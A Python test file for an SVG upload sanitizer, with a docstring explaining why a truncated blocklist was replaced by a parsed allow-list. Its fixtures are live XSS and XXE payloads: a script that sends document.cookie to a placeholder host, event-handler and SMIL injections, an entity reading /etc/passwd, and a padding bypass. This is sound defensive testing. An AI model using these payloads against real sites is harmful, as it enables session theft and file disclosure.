"""An uploaded logo is served from our origin, so it must not be a program.

SVG is a document format, not a picture format. The branding upload accepted
one verbatim and the endpoint that serves it is unauthenticated with no CSP,
so anything executable inside runs on the app's own origin — where the auth
cookie is readable, because it is not httpOnly.

The guard was a blocklist of five strings scanned over the FIRST 200,000 bytes
of a file allowed to be 512 KB. Both halves were wrong:

  * a blocklist enumerates the attacks somebody thought of. `onmouseover`,
    `<use href="...">`, `<animate attributeName="href">`, `<set>` and an XML
    entity declaration are none of the five.
  * a 200 KB window on a 512 KB limit means the last 312 KB was never read at
    all: pad, then attack.

Replaced with an allow-list over the parsed document — unknown element,
unknown attribute, or anything that will not parse is refused. Refusing a
valid-but-unusual logo is a support ticket; accepting one executable logo is
every session on the instance.
"""
import pytest
from fastapi import HTTPException

from app.services.branding_service import BrandingService

reject = BrandingService._reject_unsafe_svg

PLAIN = b'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="#123456"/></svg>'


def _refused(payload: bytes) -> bool:
    try:
        reject(payload)
        return False
    except HTTPException as e:
        assert e.status_code == 400
        return True


# --- what must still be accepted ------------------------------------------

def test_an_ordinary_logo_is_accepted():
    """★The whole point of allowing SVG. If real logos stop working, the fix
    gets reverted and the hole comes back."""
    assert not _refused(PLAIN)


def test_a_realistic_multi_element_logo_is_accepted():
    svg = (
        b'<?xml version="1.0" encoding="UTF-8"?>\n'
        b'<svg xmlns="http://www.w3.org/2000/svg" width="120" height="32" viewBox="0 0 120 32" fill="none">'
        b'<defs><linearGradient id="g" x1="0" y1="0" x2="1" y2="1">'
        b'<stop offset="0%" stop-color="#0af"/><stop offset="100%" stop-color="#06c"/>'
        b'</linearGradient></defs>'
        b'<g transform="translate(2,2)"><rect width="28" height="28" rx="6" fill="url(#g)"/>'
        b'<circle cx="14" cy="14" r="6" fill="#fff" fill-opacity="0.9"/></g>'
        b'<text x="40" y="21" font-family="Inter" font-size="14" fill="#111">City</text>'
        b'<title>City</title></svg>'
    )
    assert not _refused(svg)


# --- the five that were already caught ------------------------------------

@pytest.mark.parametrize("payload", [
    b'<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("//x/"+document.cookie)</script></svg>',
    b'<svg xmlns="http://www.w3.org/2000/svg"><a href="javascript:alert(1)"><rect/></a></svg>',
    b'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>',
    b'<svg xmlns="http://www.w3.org/2000/svg"><image href="x" onerror="alert(1)"/></svg>',
    b'<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><iframe/></body></foreignObject></svg>',
])
def test_the_originally_blocked_shapes_are_still_blocked(payload):
    assert _refused(payload)


# --- the ones a blocklist of five never saw -------------------------------

@pytest.mark.parametrize("payload,why", [
    (b'<svg xmlns="http://www.w3.org/2000/svg"><rect onmouseover="alert(1)" width="9" height="9"/></svg>',
     "a handler that is not onload or onerror"),
    (b'<svg xmlns="http://www.w3.org/2000/svg"><rect onfocusin="alert(1)"/></svg>',
     "another handler"),
    (b'<svg xmlns="http://www.w3.org/2000/svg"><animate attributeName="href" values="javascript:alert(1)"/></svg>',
     "SMIL animation rewriting an href"),
    (b'<svg xmlns="http://www.w3.org/2000/svg"><set attributeName="onload" to="alert(1)"/></svg>',
     "SMIL writing a handler attribute"),
    (b'<svg xmlns="http://www.w3.org/2000/svg"><use href="data:image/svg+xml;base64,PHN2Zz48c2NyaXB0Lz48L3N2Zz4="/></svg>',
     "pulling a second document in through <use>"),
    (b'<svg xmlns="http://www.w3.org/2000/svg"><handler type="text/javascript">alert(1)</handler></svg>',
     "the SVG 1.2 handler element"),
    (b'<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>',
     "an external entity reading the filesystem"),
    (b'<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><div/></foreignObject></svg>',
     "foreignObject with no lowercase marker to match"),
])
def test_the_shapes_a_blocklist_misses(payload, why):
    assert _refused(payload), f"still accepted: {why}"


def test_case_does_not_help_the_attacker():
    """The old check lowercased the buffer, which is right — locked in so an
    allow-list rewrite does not lose it."""
    assert _refused(b'<svg xmlns="http://www.w3.org/2000/svg"><SCRIPT>alert(1)</SCRIPT></svg>')


# --- the window ------------------------------------------------------------

def test_the_whole_file_is_inspected_not_the_first_chunk():
    """★512 KB allowed, 200 KB scanned. Pad past the window and the payload
    was never looked at."""
    padding = b"<!-- " + (b"p" * 300_000) + b" -->"
    payload = (
        b'<svg xmlns="http://www.w3.org/2000/svg">' + padding +
        b'<script>alert(1)</script></svg>'
    )
    assert len(payload) > 200_000
    assert _refused(payload)


def test_something_that_is_not_xml_at_all_is_refused():
    """A file claiming to be an SVG that will not parse cannot be reasoned
    about, so it is not stored."""
    assert _refused(b"GIF89a\x00\x00 not xml <svg>")


def test_an_empty_document_is_refused():
    assert _refused(b"")


def test_the_root_element_must_be_an_svg():
    assert _refused(b'<html xmlns="http://www.w3.org/1999/xhtml"><body>hi</body></html>')
